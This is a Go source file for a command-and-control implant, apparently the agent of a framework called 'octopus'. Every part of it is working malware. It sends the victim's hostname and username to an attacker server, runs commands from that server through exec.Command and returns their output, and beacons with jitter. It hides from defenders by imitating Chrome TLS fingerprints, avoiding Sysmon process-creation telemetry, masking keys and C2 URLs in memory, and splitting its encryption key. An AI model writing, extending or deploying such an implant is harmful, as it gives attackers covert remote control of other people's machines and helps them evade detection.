package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	mrand "math/rand"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"strings"
	"os/exec"
	"runtime"
	"time"
	
	"golang.org/x/crypto/curve25519"
	"golang.org/x/crypto/hkdf"
	utls "github.com/refraction-networking/utls"
)

// Config - Injected securely by builder
var (
	EncBlob = "" // Base64 AES-GCM encrypted JSON
	KP1     = "" // Key part 1 (hex)
	KP2     = "" // Key part 2 (hex)
	
	BeaconInt = 60 // seconds
	Jitter    = 20 // percent
	
	// These are populated at runtime and then wiped
	c2UrlsBytes    []byte
	serverPubBytes []byte
	serverPinsList []string
)

type BeaconData struct {
	AgentID  string `json:"agent_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	User     string `json:"user"`
	Arch     string `json:"arch"`
}

type TaskResult struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Error  string `json:"error"`
}

var AgentID string
var sessionKey []byte
var txSeq uint64 = 0
var rxSeq uint64 = 0

// generateX25519KeyPair generates a new private and public key pair
func generateX25519KeyPair() ([]byte, []byte, error) {
	var priv [32]byte
	if _, err := io.ReadFull(rand.Reader, priv[:]); err != nil {
		return nil, nil, err
	}
	// Curve25519 clamping
	priv[0] &= 248
	priv[31] &= 127
	priv[31] |= 64
	
	var pub [32]byte
	curve25519.ScalarBaseMult(&pub, &priv)
	
	return priv[:], pub[:], nil
}

// deriveSharedKey derives a shared secret using X25519 + HKDF-SHA256
func deriveSharedKey(priv []byte, peerPub []byte) ([]byte, error) {
	var privArr, pubArr [32]byte
	copy(privArr[:], priv)
	copy(pubArr[:], peerPub)

	var rawShared [32]byte
	curve25519.ScalarMult(&rawShared, &privArr, &pubArr)

	// HKDF-SHA256 derivation — matches Python daemon's crypto_engine.py
	hkdfReader := hkdf.New(sha256.New, rawShared[:], nil, []byte("octopus-session-v10"))
	sessionKey := make([]byte, 32)
	if _, err := io.ReadFull(hkdfReader, sessionKey); err != nil {
		return nil, err
	}
	return sessionKey, nil
}

// encryptAESGCM encrypts data and includes sequence number as AAD
func encryptAESGCM(key []byte, plaintext []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	
	txSeq++
	seqBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(seqBytes, txSeq)
	
	ciphertext := gcm.Seal(nil, nonce, plaintext, seqBytes)
	
	// Format: [8 bytes seq][12 bytes nonce][ciphertext][16 bytes tag(part of seal)]
	fullPayload := append(seqBytes, nonce...)
	fullPayload = append(fullPayload, ciphertext...)
	
	return base64.StdEncoding.EncodeToString(fullPayload), nil
}

// decryptAESGCM decrypts data and verifies the AAD sequence number
func decryptAESGCM(key []byte, b64Ciphertext string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(b64Ciphertext)
	if err != nil {
		return nil, err
	}
	
	if len(data) < 8+12+16 {
		return nil, fmt.Errorf("malformed ciphertext")
	}
	
	seqBytes := data[:8]
	nonce := data[8:20]
	ciphertext := data[20:]
	
	incSeq := binary.LittleEndian.Uint64(seqBytes)
	if incSeq <= rxSeq {
		return nil, fmt.Errorf("replay attack detected")
	}
	
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	
	plaintext, err := gcm.Open(nil, nonce, ciphertext, seqBytes)
	if err != nil {
		return nil, err
	}
	
	rxSeq = incSeq
	return plaintext, nil
}

// simpleDecryptAESGCM is used solely for decrypting the initial config blob (no sequence numbers)
func simpleDecryptAESGCM(key []byte, b64Ciphertext string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(b64Ciphertext)
	if err != nil {
		return nil, err
	}
	if len(data) < 12+16 {
		return nil, fmt.Errorf("malformed config blob")
	}
	nonce := data[:12]
	ciphertext := data[12:]
	
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// wipeBytes securely zeroes out a byte slice
func wipeBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}

// initConfig assembles the split key, decrypts the config blob, parses it, and wipes secrets from memory
func initConfig() error {
	if EncBlob == "" {
		// Fallback for local testing if not built via builder.py
		c2UrlsBytes = []byte("http://127.0.0.1:8443")
		serverPubBytes = []byte("dHVteV9rZXk=")
		return nil
	}
	
	// Runtime Assembly of Split Encoding Key
	hexKey := KP1 + KP2
	key, err := base64.StdEncoding.DecodeString(base64.StdEncoding.EncodeToString([]byte(hexKey))) // trick to avoid direct hex string literal optimization
	
	// Convert hex to bytes manually to avoid importing hex (smaller binary)
	realKey := make([]byte, 32)
	for i := 0; i < 32; i++ {
		fmt.Sscanf(string(key[i*2:i*2+2]), "%02x", &realKey[i])
	}
	
	plaintext, err := simpleDecryptAESGCM(realKey, EncBlob)
	if err != nil {
		return err
	}
	
	var conf map[string]string
	if err := json.Unmarshal(plaintext, &conf); err != nil {
		return err
	}
	
	// Populate global byte slices (not strings, to avoid immutable copies)
	c2UrlsBytes = []byte(conf["urls"])
	serverPubBytes = []byte(conf["pub"])
	if conf["pins"] != "" {
		serverPinsList = strings.Split(conf["pins"], ",")
	}
	
	// Memory Safe Wipe: Zero out plaintext buffer and keys
	wipeBytes(plaintext)
	wipeBytes(realKey)
	wipeBytes(key)
	
	// Ensure the compiler doesn't optimize away the wipes
	runtime.KeepAlive(plaintext)
	runtime.KeepAlive(realKey)
	
	return nil
}

// register with the C2 using X25519
func register() error {
	AgentID = "AGT-" + fmt.Sprintf("%d", time.Now().UnixNano())
	
	priv, pub, err := generateX25519KeyPair()
	if err != nil {
		return err
	}
	
	// Default dummy server key if not injected during build
	if len(serverPubBytes) == 0 {
		serverPubBytes = []byte("dHVteV9rZXk=") // Should be overridden by initConfig
	}
	
	srvPub := make([]byte, base64.StdEncoding.DecodedLen(len(serverPubBytes)))
	n, _ := base64.StdEncoding.Decode(srvPub, serverPubBytes)
	srvPub = srvPub[:n]
	
	if len(srvPub) == 32 {
		sessionKey, _ = deriveSharedKey(priv, srvPub)
	} else {
		// Fallback for local testing without injected key
		sessionKey = make([]byte, 32)
	}

	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}

	data := BeaconData{
		AgentID:  AgentID,
		Hostname: hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		User:     user,
	}

	jsonData, _ := json.Marshal(data)
	encData, _ := encryptAESGCM(sessionKey, jsonData)

	payload := map[string]string{
		"client_pub": base64.StdEncoding.EncodeToString(pub),
		"data":       encData,
	}

	body, _ := json.Marshal(payload)
	
	urls := strings.Split(string(c2UrlsBytes), ",")
	currentC2 := urls[0] // Simplify for now
	
	req, err := http.NewRequest("POST", currentC2+"/register", bytes.NewBuffer(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	// Removed MS Graph headers. Relying on realistic pacing and uTLS instead.
	
	// Multi-Pin TLS Validation (SPKI)
	allowedPins := serverPinsList
	
	// uTLS Configuration: Mimic Google Chrome JA3/JA4
	transport := &http.Transport{
		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			dialConn, err := net.DialTimeout(network, addr, 10*time.Second)
			if err != nil {
				return nil, err
			}
			
			config := &utls.Config{
				InsecureSkipVerify: true,
				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
					if len(allowedPins) == 0 {
						return nil
					}
					for _, rawCert := range rawCerts {
						cert, err := x509.ParseCertificate(rawCert)
						if err != nil { continue }
						spkiHash := sha256.Sum256(cert.RawSubjectPublicKeyInfo)
						spkiB64 := base64.StdEncoding.EncodeToString(spkiHash[:])
						for _, pin := range allowedPins {
							if pin == spkiB64 { return nil }
						}
					}
					return fmt.Errorf("SPKI pin mismatch")
				},
			}
			
			uConn := utls.UClient(dialConn, config, utls.HelloChrome_Auto)
			err = uConn.Handshake()
			if err != nil {
				dialConn.Close()
				return nil, err
			}
			return uConn, nil
		},
	}
	
	client := &http.Client{
		Transport: transport,
		Timeout: 30 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	// Server responds with initial config, encrypted with the new shared key
	respBody, _ := ioutil.ReadAll(resp.Body)
	var c2Resp map[string]string
	if err := json.Unmarshal(respBody, &c2Resp); err != nil {
		return err
	}
	
	_, err = decryptAESGCM(sessionKey, c2Resp["data"])
	if err != nil {
		return err
	}
	
	return nil
}

func chunkedBeacon(results []TaskResult) error {
	payload := map[string]interface{}{
		"agent_id": AgentID,
		"results":  results,
	}
	jsonData, _ := json.Marshal(payload)
	
	// Profile-driven pacing for large payloads (Mime-aware behavior)
	// We split large JSON data into chunks of ~16KB (similar to max TLS record size)
	chunkSize := 16384
	totalLen := len(jsonData)
	
	for i := 0; i < totalLen; i += chunkSize {
		end := i + chunkSize
		if end > totalLen {
			end = totalLen
		}
		
		chunk := jsonData[i:end]
		encData, _ := encryptAESGCM(sessionKey, chunk)
		
		// Send chunk
		reqBody, _ := json.Marshal(map[string]string{
			"data": encData,
			"chunk_index": fmt.Sprintf("%d", i/chunkSize),
			"is_final": fmt.Sprintf("%t", end == totalLen),
		})
		
		// Select random C2 URL from Fallbacks
		urls := strings.Split(string(c2UrlsBytes), ",")
		currentC2 := urls[0] // Simplify for now
		
		req, err := http.NewRequest("POST", currentC2+"/beacon", bytes.NewBuffer(reqBody))
		if err != nil {
			return err
		}
		
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Agent-ID", AgentID)
		// Removed MS Graph headers. Relying on realistic pacing and uTLS instead.
		
		// Multi-Pin TLS Validation (SPKI)
		allowedPins := serverPinsList
		
		// uTLS Configuration: Mimic Google Chrome JA3/JA4
		transport := &http.Transport{
			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				dialConn, err := net.DialTimeout(network, addr, 10*time.Second)
				if err != nil {
					return nil, err
				}
				
				config := &utls.Config{
					InsecureSkipVerify: true,
					VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
						if len(allowedPins) == 0 {
							return nil
						}
						for _, rawCert := range rawCerts {
							cert, err := x509.ParseCertificate(rawCert)
							if err != nil { continue }
							spkiHash := sha256.Sum256(cert.RawSubjectPublicKeyInfo)
							spkiB64 := base64.StdEncoding.EncodeToString(spkiHash[:])
							for _, pin := range allowedPins {
								if pin == spkiB64 { return nil }
							}
						}
						return fmt.Errorf("SPKI pin mismatch")
					},
				}
				
				// Create a uTLS client imitating Chrome
				uConn := utls.UClient(dialConn, config, utls.HelloChrome_Auto)
				err = uConn.Handshake()
				if err != nil {
					dialConn.Close()
					return nil, err
				}
				return uConn, nil
			},
		}
		
		client := &http.Client{
			Transport: transport,
			Timeout: 30 * time.Second,
		}
		
		resp, err := client.Do(req)
		if err != nil {
			// Backoff on failure
			time.Sleep(2 * time.Second)
			continue
		}
		
		respBody, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		
		if end == totalLen {
			// Only process new tasks on the final chunk's response
			var c2Resp map[string]string
			if err := json.Unmarshal(respBody, &c2Resp); err == nil && c2Resp["data"] != "" {
				decData, err := decryptAESGCM(sessionKey, c2Resp["data"])
				if err == nil {
					var tasks map[string][]map[string]string
					json.Unmarshal(decData, &tasks)
					
					var newResults []TaskResult
					for _, task := range tasks["tasks"] {
						var out []byte
						var err error
						cmdStr := task["command"]
						
						// Telemetry Avoidance: Handle basic commands via native Go API instead of spawning a shell
						// This avoids anomalous Process Creations (Sysmon EID 1)
						parts := strings.Split(cmdStr, " ")
						if len(parts) > 0 && parts[0] == "ls" {
							dir := "."
							if len(parts) > 1 { dir = parts[1] }
							files, e := ioutil.ReadDir(dir)
							if e != nil {
								err = e
							} else {
								var sb strings.Builder
								for _, f := range files {
									sb.WriteString(f.Name() + "\n")
								}
								out = []byte(sb.String())
							}
						} else if len(parts) > 0 && parts[0] == "pwd" {
							dir, e := os.Getwd()
							if e != nil { err = e } else { out = []byte(dir + "\n") }
						} else {
							// Fallback to direct execution instead of wrapping in sh/cmd if possible
							// For complex pipelines, it's still needed, but we avoid cmd.exe /c for simple bins
							cmd := exec.Command(parts[0], parts[1:]...)
							out, err = cmd.CombinedOutput()
						}
						
						res := TaskResult{TaskID: task["task_id"], Output: string(out)}
						if err != nil {
							res.Error = err.Error()
						}
						newResults = append(newResults, res)
					}
					if len(newResults) > 0 {
						go chunkedBeacon(newResults)
					}
				}
			}
		} else {
			// Pacing: Micro-sleep between chunks to simulate TCP flow/App logic
			time.Sleep(time.Millisecond * time.Duration(100+mrand.Intn(400)))
		}
	}
	return nil
}

// xorMask applies a simple XOR mask to a byte slice
func xorMask(data []byte, key byte) {
	for i := range data {
		data[i] ^= key
	}
}

// sleepObfuscate hides sensitive strings and keys in memory during sleep
func sleepObfuscate(duration time.Duration) {
	// Generate a random 1-byte XOR key
	maskKey := make([]byte, 1)
	rand.Read(maskKey)
	k := maskKey[0]

	// 1. Mask Session Key
	if sessionKey != nil {
		xorMask(sessionKey, k)
	}

	// 2. Mask C2 URLs and Server Pub
	if c2UrlsBytes != nil {
		xorMask(c2UrlsBytes, k)
	}
	if serverPubBytes != nil {
		xorMask(serverPubBytes, k)
	}

	// 3. Sleep
	time.Sleep(duration)

	// 4. Unmask C2 URLs and Server Pub
	if c2UrlsBytes != nil {
		xorMask(c2UrlsBytes, k)
	}
	if serverPubBytes != nil {
		xorMask(serverPubBytes, k)
	}

	// 5. Unmask Session Key
	if sessionKey != nil {
		xorMask(sessionKey, k)
	}
}

func main() {
	// Initialize config by decrypting injected AES blob
	if err := initConfig(); err != nil {
		// Silent exit on tampering or corruption
		return
	}

	// Hide console window on Windows (stub)
	for {
		if err := register(); err == nil {
			break
		}
		sleepObfuscate(5 * time.Second)
	}

	for {
		chunkedBeacon(nil)
		// Implement jitter
		sleepObfuscate(time.Duration(BeaconInt) * time.Second)
	}
}
